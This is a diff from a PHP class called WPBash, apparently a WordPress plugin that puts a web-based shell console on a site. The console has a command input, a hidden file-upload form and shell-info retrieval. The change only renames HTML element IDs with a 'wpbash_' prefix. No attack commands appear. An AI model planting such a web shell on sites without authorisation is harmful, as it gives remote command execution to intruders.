@@ -166,16 +166,16 @@ class WPBash
             }
         </style>
         <div class="console">
-            <div class="output" id="output"></div>
-            <div class="input" id="input">
+            <div class="output" id="wpbash_output"></div>
+            <div class="input" id="wpbash_input">
                 <form id="form" method="GET" onSubmit="sendCommand()">
-                    <div class="username" id="username"></div>
-                    <input class="inputtext" id="inputtext" type="text" name="cmd" autocomplete="off" autofocus>
+                    <div class="username" id="wpbash_username"></div>
+                    <input class="inputtext" id="wpbash_inputtext" type="text" name="cmd" autocomplete="off" autofocus>
                 </form>
             </div>
         </div>
-        <form id="upload" method="POST" style="display: none;">
-            <input type="file" name="file" id="filebrowser" onchange='uploadFile()' />
+        <form id="wpbash_upload" method="POST" style="display: none;">
+            <input type="file" name="file" id="wpbash_filebrowser" onchange='uploadFile()' />
         </form>
         <script type="text/javascript">
             var username = "";
@@ -185,12 +185,12 @@ class WPBash
             var defaultDir = "";
             var commandHistory = [];
             var currentCommand = 0;
-            var inputTextElement = document.getElementById('inputtext');
-            var inputElement = document.getElementById("input");
-            var outputElement = document.getElementById("output");
-            var usernameElement = document.getElementById("username");
-            var uploadFormElement = document.getElementById("upload");
-            var fileBrowserElement = document.getElementById("filebrowser");
+            var inputTextElement = document.getElementById('wpbash_inputtext');
+            var inputElement = document.getElementById("wpbash_input");
+            var outputElement = document.getElementById("wpbash_output");
+            var usernameElement = document.getElementById("wpbash_username");
+            var uploadFormElement = document.getElementById("wpbash_upload");
+            var fileBrowserElement = document.getElementById("wpbash_filebrowser");
             getShellInfo();
             
             function getShellInfo() {
